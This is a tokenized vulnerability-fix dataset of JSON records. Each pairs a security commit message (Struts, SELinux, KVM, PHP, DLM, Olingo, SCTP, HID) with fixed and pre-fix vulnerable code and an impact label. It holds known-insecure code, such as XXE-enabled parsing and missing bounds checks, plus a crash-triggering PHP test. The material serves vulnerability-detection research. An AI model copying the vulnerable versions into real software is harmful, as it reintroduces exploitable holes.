{"contents": ["Reduces", "expression", "evaluation", "if", "there", "is", "no", "expression"], "code_tokens": ["if", "(", "ComponentUtils", ".", "containsExpression", "(", "expr", ")", ")", "{", "return", "TextParseUtil", ".", "translateVariables", "(", "'%", "',", "expr", ",", "stack", ")", ";", "}", "else", "{", "return", "expr", ";", "}", "*", "@", "param", "expr", "to", "treat", "as", "an", "expression", "public", "static", "boolean", "isExpression", "(", "String", "expr", ")", "{", "public", "static", "boolean", "containsExpression", "(", "String", "expr", ")", "{", "return", "expr", ".", "contains", "(", "\"%", "{\"", ")", "&", "&", "expr", ".", "contains", "(", "\"}", "\")", ";", "}", "if", "(", "ComponentUtils", ".", "altSyntax", "(", "getStack", "(", "))", "&", "&", "ComponentUtils", ".", "isExpression", "(", "value", ".", "toString", "(", "))", ")", "{", "public", "void", "testIsExpressionIsFalseWhenCombined", "(", ")", "throws", "Exception", "{", "/", "/", "given", "String", "anExpression", "=", "\"", "bar", "%", "{", "foo", "}", "\";", "/", "/", "when", "boolean", "actual", "=", "ComponentUtils", ".", "isExpression", "(", "anExpression", ")", ";", "/", "/", "then", "assertFalse", "(", "actual", ")", ";", "}", "public", "void", "testContainsExpressionIsTrue", "(", ")", "throws", "Exception", "{", "/", "/", "given", "String", "anExpression", "=", "\"", "%{", "foo", "}", "\";", "/", "/", "when", "boolean", "actual", "=", "ComponentUtils", ".", "containsExpression", "(", "anExpression", ")", ";", "/", "/", "then", "assertTrue", "(", "actual", ")", ";", "}", "public", "void", "testIsContainsIsTrueWhenCombined", "(", ")", "throws", "Exception", "{", "/", "/", "given", "String", "anExpression", "=", "\"", "bar", "%", "{", "foo", "}", "\";", "/", "/", "when", "boolean", "actual", "=", "ComponentUtils", ".", "containsExpression", "(", "anExpression", ")", ";", "/", "/", "then", "assertTrue", "(", "actual", ")", ";", "}", "public", "void", "testContainsExpressionIsFalse", "(", ")", "throws", "Exception", "{", "/", "/", "given", "String", "anExpression", "=", "\"", "foo", "\"", ";", "/", "/", "when", "boolean", "actual", "=", "ComponentUtils", ".", "containsExpression", "(", "anExpression", ")", ";", "/", "/", "then", "assertFalse", "(", "actual", ")", ";", "}</s>return", "TextParseUtil", ".", "translateVariables", "(", "'%", "',", "expr", ",", "stack", ")", ";", "*", "@", "param", "value", "to", "treat", "as", "an", "expression", "public", "static", "boolean", "isExpression", "(", "Object", "value", ")", "{", "String", "expr", "=", "value", ".", "toString", "(", ");", "if", "(", "ComponentUtils", ".", "altSyntax", "(", "getStack", "(", "))", "&", "&", "ComponentUtils", ".", "isExpression", "(", "value", ")", ")", "{"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["Enforce", "a", "minimum", "SG_IO", "timeout", "There's", "no", "point", "in", "having", "too", "short", "SG_IO", "timeouts,", "since", "if", "the", "command", "does", "end", "up", "timing", "out,", "we'll", "end", "up", "through", "the", "reset", "sequence", "that", "is", "several", "seconds", "long", "in", "order", "to", "abort", "the", "command", "that", "timed", "out.", "As", "a", "result,", "shorter", "timeouts", "than", "a", "few", "seconds", "simply", "do", "not", "make", "sense,", "as", "the", "recovery", "would", "be", "longer", "than", "the", "timeout", "itself.", "Add", "a", "BLK_MIN_SG_TIMEOUT", "to", "match", "the", "existign", "BLK_DEFAULT_SG_TIMEOUT.", "Suggested-by:", "Alan", "Cox", "<alan@lxorguk.ukuu.org.uk>", "Acked-by:", "Tejun", "Heo", "<tj@kernel.org>", "Acked-by:", "Jens", "Axboe", "<jens.axboe@oracle.com>", "Cc:", "Jeff", "Garzik", "<jeff@garzik.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "rq", "-", ">", "timeout", "<", "BLK_MIN_SG_TIMEOUT", ")", "rq", "-", ">", "timeout", "=", "BLK_MIN_SG_TIMEOUT", ";", "if", "(", "rq", "-", ">", "timeout", "<", "BLK_MIN_SG_TIMEOUT", ")", "rq", "-", ">", "timeout", "=", "BLK_MIN_SG_TIMEOUT", ";", "#", "define", "BLK_MIN_SG_TIMEOUT", "(", "7", "*", "HZ", ")</s>"], "docstring_tokens": ["a", "denial", "of", "service"]}
{"contents": ["SELinux:", "call", "cap_file_mmap", "in", "selinux_file_mmap", "Currently", "SELinux", "does", "not", "check", "CAP_SYS_RAWIO", "in", "the", "file_mmap", "hook.", "This", "means", "there", "is", "no", "DAC", "check", "on", "the", "ability", "to", "mmap", "low", "addresses", "in", "the", "memory", "space.", "This", "function", "adds", "the", "DAC", "check", "for", "CAP_SYS_RAWIO", "while", "maintaining", "the", "selinux", "check", "on", "mmap_zero.", "This", "means", "that", "processes", "which", "need", "to", "mmap", "low", "memory", "will", "need", "CAP_SYS_RAWIO", "and", "mmap_zero", "but", "will", "NOT", "need", "the", "SELinux", "sys_rawio", "capability.", "Signed-off-by:", "Eric", "Paris", "<eparis@redhat.com>", "Signed-off-by:", "James", "Morris", "<jmorris@namei.org>"], "code_tokens": ["/", "*", "*", "notice", "that", "we", "are", "intentionally", "putting", "the", "SELinux", "check", "before", "*", "the", "secondary", "cap_file_mmap", "check", ".", "This", "is", "such", "a", "likely", "attempt", "*", "at", "bad", "behaviour", "/", "exploit", "that", "we", "always", "want", "to", "get", "the", "AVC", ",", "even", "*", "if", "DAC", "would", "have", "also", "denied", "the", "operation", ".", "*", "/", "if", "(", "addr", "<", "mmap_min_addr", ")", "{", "if", "(", "rc", ")", "return", "rc", ";", "}", "/", "*", "do", "DAC", "check", "on", "address", "space", "usage", "*", "/", "rc", "=", "cap_file_mmap", "(", "file", ",", "reqprot", ",", "prot", ",", "flags", ",", "addr", ",", "addr_only", ")", ";</s>if", "(", "addr", "<", "mmap_min_addr", ")"], "docstring_tokens": ["gain", "elevated", "privileges", "on", "the", "system"]}
{"contents": ["kvm:", "x86:", "fix", "kvm_apic_has_events", "to", "check", "for", "NULL", "pointer", "Malicious", "(or", "egregiously", "buggy)", "userspace", "can", "trigger", "it,", "but", "it", "should", "never", "happen", "in", "normal", "operation.", "Signed-off-by:", "Paolo", "Bonzini", "<pbonzini@redhat.com>"], "code_tokens": ["return", "kvm_vcpu_has_lapic", "(", "vcpu", ")", "&", "&", "vcpu", "-", ">", "arch", ".", "apic", "-", ">", "pending_events", ";</s>return", "vcpu", "-", ">", "arch", ".", "apic", "-", ">", "pending_events", ";"], "docstring_tokens": ["the", "kernel", "to", "crash"]}
{"contents": ["Fixed", "bug", "#75535", "The", "sizeof()s", "for", "Content-Length", "and", "Transfer-Encoding", "were", "missing", "the", "trailing", "\":\".", "Apart", "from", "being", "generally", "wrong,", "this", "no", "longer", "verified", "that", "the", "header", "actually", "contains", "a", "colon,", "leading", "to", "the", "null", "http_header_value", "being", "used.", "Additionally,", "in", "the", "interest", "of", "being", "defensive,", "also", "make", "sure", "that", "http_header_value", "is", "non-null", "by", "setting", "it", "to", "the", "end", "of", "the", "header", "line", "(effectively", "an", "empty", "string)", "if", "there", "is", "no", "colon.", "If", "the", "following", "conditions", "are", "correct,", "this", "value", "is", "not", "going", "to", "be", "used", "though."], "code_tokens": ["-", "Standard", ":", ".", "Fixed", "bug", "#", "75535", "(", "Inappropriately", "parsing", "HTTP", "response", "leads", "to", "PHP", "segment", "fault", ")", ".", "(", "Nikita", ")", "}", "else", "{", "/", "*", "There", "is", "no", "colon", ".", "Set", "the", "value", "to", "the", "end", "of", "the", "header", "line", ",", "which", "is", "*", "effectively", "an", "empty", "string", ".", "*", "/", "http_header_value", "=", "e", ";", "}", "else", "if", "(", "!", "strncasecmp", "(", "http_header_line", ",", "\"", "Content", "-", "Length", ":", "\",", "sizeof", "(", "\"", "Content", "-", "Length", ":", "\")", "-", "1", ")", ")", "{", "!", "strncasecmp", "(", "http_header_line", ",", "\"", "Transfer", "-", "Encoding", ":", "\",", "sizeof", "(", "\"", "Transfer", "-", "Encoding", ":", "\")", "-", "1", ")", "-", "-", "TEST", "-", "-", "Bug", "#", "75535", ":", "Inappropriately", "parsing", "HTTP", "response", "leads", "to", "PHP", "segment", "fault", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "require", "'", "server", ".", "inc", "'", ";", "http_server_skipif", "(", "'", "tcp", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "22351", "'", ");", "?", ">", "-", "-", "INI", "-", "-", "allow_url_fopen", "=", "1", "-", "-", "FILE", "-", "-", "<", "?", "php", "require", "'", "server", ".", "inc", "'", ";", "$", "responses", "=", "array", "(", "\"", "data", ":", "//", "text", "/", "plain", ",", "HTTP", "/", "1", ".", "0", "200", "Ok", "\\", "r", "\\", "nContent", "-", "Length", "\\", "r", "\\", "n", "\"", ",", ")", ";", "$", "pid", "=", "http_server", "(", "\"", "tcp", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "22351", "\"", ",", "$", "responses", ",", "$", "output", ")", ";", "var_dump", "(", "file_get_contents", "(", "'", "http", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "22351", "/", "')", ");", "var_dump", "(", "$", "http_response_header", ")", ";", "http_server_kill", "(", "$", "pid", ")", ";", "?", ">", "=", "=", "DONE", "=", "=", "-", "-", "EXPECT", "-", "-", "string", "(", "0", ")", "\"", "\"", "array", "(", "2", ")", "{", "[", "0", "]", "=>", "string", "(", "15", ")", "\"", "HTTP", "/", "1", ".", "0", "200", "Ok", "\"", "[", "1", "]", "=>", "string", "(", "14", ")", "\"", "Content", "-", "Length", "\"", "}", "=", "=", "DONE", "=", "=</s>-", "Core", ":", "@", "@", "-", "796", ",", "6", "+", "796", ",", "10", "@", "@", "php_stream", "*", "php_stream_url_wrap_http_ex", "(", "php_stream_wrapper", "*", "wrapper", ",", "}", "else", "if", "(", "!", "strncasecmp", "(", "http_header_line", ",", "\"", "Content", "-", "Length", ":", "\",", "sizeof", "(", "\"", "Content", "-", "Length", "\"", ")-", "1", ")", ")", "{", "!", "strncasecmp", "(", "http_header_line", ",", "\"", "Transfer", "-", "Encoding", ":", "\",", "sizeof", "(", "\"", "Transfer", "-", "Encoding", "\"", ")-", "1", ")"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["[DLM]", "Telnet", "to", "port", "21064", "can", "stop", "all", "lockspaces", "This", "patch", "fixes", "Red", "Hat", "bz#245892", "Opening", "a", "tcp", "connection", "from", "a", "cluster", "member", "to", "another", "cluster", "member", "targeting", "the", "dlm", "port", "it", "is", "enough", "to", "stop", "every", "dlm", "operation", "in", "the", "cluster.", "This", "means", "that", "GFS", "and", "rgmanager", "will", "hang.", "Signed-Off-By:", "Patrick", "Caulfield", "<pcaulfie@redhat.com>", "Signed-off-by:", "Steven", "Whitehouse", "<swhiteho@redhat.com>"], "code_tokens": ["othercon", "-", ">", "sock", "=", "newsock", ";", "newsock", "-", ">", "sk", "-", ">", "sk_user_data", "=", "othercon", ";", "add_sock", "(", "newsock", ",", "othercon", ")", ";", "addcon", "=", "othercon", ";", "}", "else", "{", "printk", "(", "\"", "Extra", "connection", "from", "node", "%", "d", "attempted", "\\", "n", "\"", ",", "nodeid", ")", ";", "result", "=", "-", "EAGAIN", ";", "up_write", "(", "&", "newcon", "-", ">", "sock_sem", ")", ";", "goto", "accept_err", ";</s>othercon", "-", ">", "sock", "=", "newsock", ";", "newsock", "-", ">", "sk", "-", ">", "sk_user_data", "=", "othercon", ";", "add_sock", "(", "newsock", ",", "othercon", ")", ";", "addcon", "=", "othercon", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(loss", "of", "lock", "services", ")"]}
{"contents": ["[OLINGO-1409]", "XML", "serializer", "defaults"], "code_tokens": ["XMLInputFactory", "xmlInputFactory", "=", "createXmlInputFactory", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "createXmlInputFactory", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "createXmlInputFactory", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "createXmlInputFactory", "(", ");", "}", "private", "XMLInputFactory", "createXmlInputFactory", "(", ")", "{", "XMLInputFactory", "factory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "factory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "false", ")", ";", "factory", ".", "setProperty", "(", "\"", "javax", ".", "xml", ".", "stream", ".", "isSupportingExternalEntities", "\"", ",", "false", ")", ";", "return", "factory", ";", "}", "FACTORY", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "false", ")", ";", "FACTORY", ".", "setProperty", "(", "\"", "javax", ".", "xml", ".", "stream", ".", "isSupportingExternalEntities", "\"", ",", "false", ")", ";</s>XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "}"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "the", "system"]}
{"contents": ["sctp:", "Use", "correct", "sideffect", "command", "in", "duplicate", "cookie", "handling", "When", "SCTP", "is", "done", "processing", "a", "duplicate", "cookie", "chunk,", "it", "tries", "to", "delete", "a", "newly", "created", "association.", "For", "that,", "it", "has", "to", "set", "the", "right", "association", "for", "the", "side-effect", "processing", "to", "work.", "However,", "when", "it", "uses", "the", "SCTP_CMD_NEW_ASOC", "command,", "that", "performs", "more", "work", "then", "really", "needed", "(like", "hashing", "the", "associationa", "and", "assigning", "it", "an", "id)", "and", "there", "is", "no", "point", "to", "do", "that", "only", "to", "delete", "the", "association", "as", "a", "next", "step.", "In", "fact,", "it", "also", "creates", "an", "impossible", "condition", "where", "an", "association", "may", "be", "found", "by", "the", "getsockopt()", "call,", "and", "that", "association", "is", "empty.", "This", "causes", "a", "crash", "in", "some", "sctp", "getsockopts.", "The", "solution", "is", "rather", "simple.", "We", "simply", "use", "SCTP_CMD_SET_ASOC", "command", "that", "doesn't", "have", "all", "the", "overhead", "and", "does", "exactly", "what", "we", "need.", "Reported-by:", "Karl", "Heiss", "<kheiss@gmail.com>", "Tested-by:", "Karl", "Heiss", "<kheiss@gmail.com>", "CC:", "Neil", "Horman", "<nhorman@tuxdriver.com>", "Signed-off-by:", "Vlad", "Yasevich", "<vyasevich@gmail.com>", "Acked-by:", "Neil", "Horman", "<nhorman@tuxdriver.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SET_ASOC", ",", "SCTP_ASOC", "(", "new_asoc", ")", ");</s>sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_NEW_ASOC", ",", "SCTP_ASOC", "(", "new_asoc", ")", ");"], "docstring_tokens": ["the", "system", "to", "crash"]}
{"contents": ["HID:", "LG:", "validate", "HID", "output", "report", "details", "A", "HID", "device", "could", "send", "a", "malicious", "output", "report", "that", "would", "cause", "the", "lg,", "lg3,", "and", "lg4", "HID", "drivers", "to", "write", "beyond", "the", "output", "report", "allocation", "during", "an", "event,", "causing", "a", "heap", "overflow:", "[", "325.245240]", "usb", "1-1:", "New", "USB", "device", "found,", "idVendor=046d,", "idProduct=c287", "...", "[", "414.518960]", "BUG", "kmalloc-4096", "(Not", "tainted):", "Redzone", "overwritten", "Additionally,", "while", "lg2", "did", "correctly", "validate", "the", "report", "details,", "it", "was", "cleaned", "up", "and", "shortened.", "Signed-off-by:", "Kees", "Cook", "<keescook@chromium.org>", "Cc:", "stable@vger.kernel.org", "Reviewed-by:", "Benjamin", "Tissoires", "<benjamin.tissoires@redhat.com>", "Signed-off-by:", "Jiri", "Kosina", "<jkosina@suse.cz>"], "code_tokens": ["/", "*", "Check", "that", "the", "report", "looks", "ok", "*", "/", "report", "=", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ";", "if", "(", "!", "report", ")", "*", "Available", "values", "in", "the", "field", "should", "always", "be", "63", ",", "but", "we", "only", "use", "up", "to", "*", "35", ".", "Instead", ",", "clear", "the", "entire", "area", ",", "however", "big", "it", "is", ".", "memset", "(", "report", "-", ">", "field", "[", "0", "]", "->", "value", ",", "0", ",", "sizeof", "(", "__s32", ")", "*", "report", "-", ">", "field", "[", "0", "]", "->", "report_count", ")", ";", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "35", ")", ")", "return", "-", "ENODEV", ";", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ")", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ")", "return", "-", "ENODEV", ";</s>struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "no", "output", "report", "found", "\\", "n", "\"", ");", "}", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "report", "-", ">", "maxfield", "<", "1", ")", "{", "hid_err", "(", "hid", ",", "\"", "output", "report", "is", "empty", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "if", "(", "report", "-", ">", "field", "[", "0", "]", "->", "report_count", "<", "7", ")", "{", "hid_err", "(", "hid", ",", "\"", "not", "enough", "values", "in", "the", "field", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "*", "Maxusage", "should", "always", "be", "63", "(", "maximum", "fields", ")", "*", "likely", "a", "better", "way", "to", "ensure", "this", "data", "is", "clean", "memset", "(", "report", "-", ">", "field", "[", "0", "]", "->", "value", ",", "0", ",", "sizeof", "(", "__s32", ")", "*", "report", "-", ">", "field", "[", "0", "]", "->", "maxusage", ")", ";", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "!", "report", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "output", "report", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "!", "report", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "output", "report", "\\", "n", "\"", ");", "}", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["[PATCH]", "x86_64:", "Add", "a", "guard", "page", "at", "the", "end", "of", "the", "47bit", "address", "space", "This", "works", "around", "a", "bug", "in", "the", "AMD", "K8", "CPUs.", "Signed-off-by:", "Andi", "Kleen", "<ak@suse.de>", "Signed-off-by:", "Andrew", "Morton", "<akpm@osdl.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["*", "User", "space", "process", "size", ".", "47bits", "minus", "one", "guard", "page", ".", "#", "define", "TASK_SIZE", "(", "0x800000000000UL", "-", "4096", ")</s>*", "User", "space", "process", "size", ".", "47bits", ".", "#", "define", "TASK_SIZE", "(", "0x800000000000UL", ")"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "."]}
{"contents": ["WELD-1802", "RequestScopedCache", "-", "Testcase"], "code_tokens": ["/", "*", "*", "JBoss", ",", "Home", "of", "Professional", "Open", "Source", "*", "Copyright", "2014", ",", "Red", "Hat", ",", "Inc", ".", ",", "and", "individual", "contributors", "*", "by", "the", "@", "authors", "tag", ".", "See", "the", "copyright", ".", "txt", "in", "the", "distribution", "for", "a", "*", "full", "listing", "of", "individual", "contributors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "jboss", ".", "weld", ".", "tests", ".", "contexts", ".", "cache", ";", "import", "java", ".", "io", ".", "Serializable", ";", "import", "javax", ".", "enterprise", ".", "context", ".", "ConversationScoped", ";", "@", "ConversationScoped", "public", "class", "ConversationScopedBean", "implements", "Serializable", "{", "private", "String", "value", "=", "\"", "foo", "\"", ";", "public", "String", "getAndSet", "(", "String", "newValue", ")", "{", "String", "old", "=", "value", ";", "value", "=", "newValue", ";", "return", "old", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "80", "@", "@", "/", "*", "*", "JBoss", ",", "Home", "of", "Professional", "Open", "Source", "*", "Copyright", "2014", ",", "Red", "Hat", ",", "Inc", ".", ",", "and", "individual", "contributors", "*", "by", "the", "@", "authors", "tag", ".", "See", "the", "copyright", ".", "txt", "in", "the", "distribution", "for", "a", "*", "full", "listing", "of", "individual", "contributors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "jboss", ".", "weld", ".", "tests", ".", "contexts", ".", "cache", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "junit", ".", "framework", ".", "Assert", ";", "import", "org", ".", "jboss", ".", "arquillian", ".", "container", ".", "test", ".", "api", ".", "Deployment", ";", "import", "org", ".", "jboss", ".", "arquillian", ".", "junit", ".", "Arquillian", ";", "import", "org", ".", "jboss", ".", "arquillian", ".", "test", ".", "api", ".", "ArquillianResource", ";", "import", "org", ".", "jboss", ".", "shrinkwrap", ".", "api", ".", "ShrinkWrap", ";", "import", "org", ".", "jboss", ".", "shrinkwrap", ".", "api", ".", "asset", ".", "EmptyAsset", ";", "import", "org", ".", "jboss", ".", "shrinkwrap", ".", "api", ".", "spec", ".", "WebArchive", ";", "import", "org", ".", "jboss", ".", "weld", ".", "tests", ".", "category", ".", "Integration", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "experimental", ".", "categories", ".", "Category", ";", "import", "org", ".", "junit", ".", "runner", ".", "RunWith", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "FailingHttpStatusCodeException", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "WebClient", ";", "@", "RunWith", "(", "Arquillian", ".", "class", ")", "@", "Category", "(", "Integration", ".", "class", ")", "public", "class", "RequestScopedCacheLeakTest", "{", "@", "ArquillianResource", "private", "URL", "contextPath", ";", "@", "Deployment", "(", "testable", "=", "false", ")", "public", "static", "WebArchive", "getDeployment", "(", ")", "{", "return", "ShrinkWrap", ".", "create", "(", "WebArchive", ".", "class", ")", ".", "addAsWebInfResource", "(", "EmptyAsset", ".", "INSTANCE", ",", "\"", "beans", ".", "xml", "\"", ")", ".", "addClasses", "(", "SimpleServlet", ".", "class", ",", "ConversationScopedBean", ".", "class", ")", ";", "}", "@", "Test", "public", "void", "test", "(", ")", "throws", "Exception", "{", "WebClient", "webClient", "=", "new", "WebClient", "(", ");", "webClient", ".", "setThrowExceptionOnFailingStatusCode", "(", "false", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "100", ";", "i", "+", "+)", "{", "/", "/", "first", ",", "send", "out", "a", "hundred", "of", "poisoning", "requests", "/", "/", "each", "of", "these", "should", "leave", "a", "thread", "in", "a", "broken", "state", "sendRequest", "(", "webClient", ",", "i", ",", "true", ")", ";", "}", "for", "(", "int", "i", "=", "0", ";", "i", "<", "100", ";", "i", "+", "+)", "{", "/", "/", "now", "send", "out", "normal", "requests", "to", "see", "if", "they", "are", "affected", "by", "the", "thread", "'", "s", "broken", "state", "String", "result", "=", "sendRequest", "(", "webClient", ",", "i", ",", "false", ")", ";", "Assert", ".", "assertFalse", "(", "\"", "Invalid", "state", "detected", "after", "\"", "+", "(", "i", "+", "1", ")", "+", "\"", "requests", "\"", ",", "result", ".", "startsWith", "(", "\"", "bar", "\"", "))", ";", "}", "}", "private", "String", "sendRequest", "(", "WebClient", "webClient", ",", "int", "sequence", ",", "boolean", "poison", ")", "throws", "FailingHttpStatusCodeException", ",", "MalformedURLException", ",", "IOException", "{", "final", "String", "path", "=", "getPath", "(", "\"", "getAndSet", "\"", ",", "sequence", ",", "poison", ")", ";", "return", "webClient", ".", "getPage", "(", "path", ")", ".", "getWebResponse", "(", ").", "getContentAsString", "(", ").", "trim", "(", ");", "}", "private", "String", "getPath", "(", "String", "test", ",", "int", "sequence", ",", "boolean", "poison", ")", "{", "String", "path", "=", "contextPath", "+", "\"", "/", "servlet", "?", "action", "=", "\"", "+", "test", "+", "\"", "&", "sequence", "=", "\"", "+", "sequence", ";", "if", "(", "poison", ")", "{", "path", "+", "=", "\"", "&", "poison", "=", "true", "\"", ";", "}", "return", "path", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "55", "@", "@", "/", "*", "*", "JBoss", ",", "Home", "of", "Professional", "Open", "Source", "*", "Copyright", "2014", ",", "Red", "Hat", ",", "Inc", ".", ",", "and", "individual", "contributors", "*", "by", "the", "@", "authors", "tag", ".", "See", "the", "copyright", ".", "txt", "in", "the", "distribution", "for", "a", "*", "full", "listing", "of", "individual", "contributors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "jboss", ".", "weld", ".", "tests", ".", 